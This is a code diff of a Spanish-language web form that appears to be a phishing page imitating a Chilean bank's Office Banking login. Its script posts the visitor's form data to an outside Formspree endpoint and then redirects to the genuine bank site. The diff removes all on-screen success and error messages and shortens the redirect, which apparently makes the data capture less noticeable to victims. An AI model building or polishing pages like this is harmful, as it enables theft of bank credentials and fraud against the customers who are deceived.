@@ -164,30 +164,6 @@
     color: #d41a23;
   }
 
-  .mensaje {
-    margin-top: 20px;
-    padding: 15px;
-    border-radius: 5px;
-    text-align: center;
-    display: none;
-    font-weight: 600;
-    font-size: 13px;
-  }
-
-  .mensaje.exito {
-    background: #d4edda;
-    color: #155724;
-    border: 1px solid #c3e6cb;
-    display: block;
-  }
-
-  .mensaje.error {
-    background: #f8d7da;
-    color: #721c24;
-    border: 1px solid #f5c6cb;
-    display: block;
-  }
-
   .cargando {
     display: none;
     text-align: center;
@@ -274,8 +250,6 @@
 
       <button type="submit" class="form-button" id="boton">Aceptar</button>
     </form>
-
-    <div class="mensaje" id="mensaje"></div>
     
     <div class="cargando" id="cargando">
       <div class="spinner"></div>
@@ -287,7 +261,6 @@
 
   <script>
     const formulario = document.getElementById('formulario');
-    const mensaje = document.getElementById('mensaje');
     const cargando = document.getElementById('cargando');
     const boton = document.getElementById('boton');
 
@@ -300,7 +273,6 @@
       // Mostrar cargando
       cargando.style.display = 'block';
       boton.disabled = true;
-      mensaje.style.display = 'none';
 
       try {
         const respuesta = await fetch('https://formspree.io/f/mzeznpoq', {
@@ -317,29 +289,20 @@
         });
 
         if (respuesta.ok) {
-          mostrarMensaje('✓ Datos enviados correctamente', 'exito');
           formulario.reset();
           
-          // Redirigir después de 2 segundos
+          // Redirigir después de 1 segundo
           setTimeout(() => {
             window.location.href = 'https://empresas.officebanking.cl/article/app-office-banking';
-          }, 2000);
-        } else {
-          mostrarMensaje('✗ Error al enviar los datos', 'error');
+          }, 1000);
         }
       } catch (error) {
-        mostrarMensaje('✗ Error de conexión: ' + error.message, 'error');
+        console.log('Error:', error);
       } finally {
         cargando.style.display = 'none';
         boton.disabled = false;
       }
     });
-
-    function mostrarMensaje(texto, tipo) {
-      mensaje.textContent = texto;
-      mensaje.className = `mensaje ${tipo}`;
-      mensaje.style.display = 'block';
-    }
   </script>
 </body>
 </html>
